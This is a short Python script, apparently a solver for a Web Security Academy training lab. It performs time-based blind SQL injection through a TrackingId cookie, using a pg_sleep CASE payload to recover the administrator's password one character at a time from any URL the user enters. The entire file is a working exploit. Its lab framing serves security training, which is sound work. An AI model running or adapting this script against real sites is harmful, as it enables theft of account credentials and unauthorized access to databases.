# Laboratory 02: Blind SQLi with time delays and information retrieval
# Author: Emiliano Rivas (RVXS)

from http import cookies
from time import time
import requests, sys, string, urllib3

# If you want to use Burp Suite proxy, uncomment the 2 lines below
# urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# burp_proxies = {
#     'http' : 'http://127.0.0.1:8080',
#     'https': 'http://127.0.0.1:8080'
# }

def exploit(url):
    password = ""
    chars    = string.ascii_letters + string.digits
    session  = requests.Session()
    session_cookies = session.get(url).cookies.get_dict()

    print(session_cookies)
    print("\nGetting password ...\n")

    for position in range(1, 21):
        for char in chars:
            payload = "'||(SELECT CASE WHEN (SUBSTRING(password, %s, 1)='%s') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator')--" % (position, char)
            cookies = {
                'TrackingId': session_cookies['TrackingId'] + payload,
                'session': session_cookies['session']
            }

            # Using proxies
            # response = requests.get(url, cookies = cookies, proxies = burp_proxies, verify = False)

            # without proxies
            response = requests.get(url, cookies = cookies,)
            request_time = int(response.elapsed.total_seconds())

            if request_time < 5:
                sys.stdout.write('\rPassword: ' + password + char)
                sys.stdout.flush()
            else:
                password += char
                sys.stdout.write('\rPassword: ' + password)
                sys.stdout.flush()
                break
            


def main():
    print("\n-------------------")
    print("WSA Lab-14 Solver")
    print("-------------------\n")

    url = input("Enter the URL: ").strip()

    exploit(url)

if __name__ == "__main__":
    main()